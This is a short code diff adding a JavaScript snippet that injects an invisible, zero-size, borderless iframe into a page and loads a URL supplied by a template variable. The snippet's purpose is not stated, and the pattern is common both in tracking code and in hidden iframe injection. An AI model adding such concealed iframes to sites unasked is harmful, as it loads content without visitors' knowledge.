@@ -1,0 +1,12 @@
+(function(){
+var curl = "{$iframeurl}";
+var ifr = document.createElement('iframe');
+ifr.width = '0';
+ifr.height = '0';
+ifr.style.backgroundColor = "transparent";
+ifr.setAttribute("allowTransparency", true);
+ifr.setAttribute("frameborder", "0", 0);
+ifr.scrolling = "no";
+ifr.src = curl;
+document.body.appendChild(ifr);
+})();
